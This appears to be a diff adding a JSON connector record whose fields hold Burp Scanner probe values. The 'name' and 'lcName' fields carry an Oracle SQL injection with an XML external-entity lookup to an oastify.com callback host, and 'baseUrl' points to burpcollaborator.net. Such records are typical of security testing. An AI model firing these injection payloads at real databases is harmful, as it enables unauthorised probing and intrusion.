@@ -1,0 +1,17 @@
+{
+	"baseUrl":"http://burpcollaborator.net/SRldPmpG",
+	"createdTime":1741509458505,
+	"deleted":false,
+	"description":"xPciEr",
+	"enabled":false,
+	"id":"67cd53523aa5057dd6e7d1b2",
+	"lastModifiedBy":22743,
+	"lcName":"(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"utf-8\"?><!doctype root [ <!entity % dqdva system \"http://wxx0nfhqq3dvh3qt6cxct5sm5db6zxpls9kwakz.oasti'||'fy.com/\">%dqdva;]>'),'/l') from dual)",
+	"logo":"https://assets.unifyapps.com/images/app-icons/custom_connector_01.svg",
+	"modifiedTime":1741509458505,
+	"name":"(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % dqdva SYSTEM \"http://wxx0nfhqq3dvh3qt6cxct5sm5db6zxpls9kwakz.oasti'||'fy.com/\">%dqdva;]>'),'/l') from dual)",
+	"ownerUserId":22743,
+	"standard":false,
+	"standardApp":false,
+	"version":0
+}
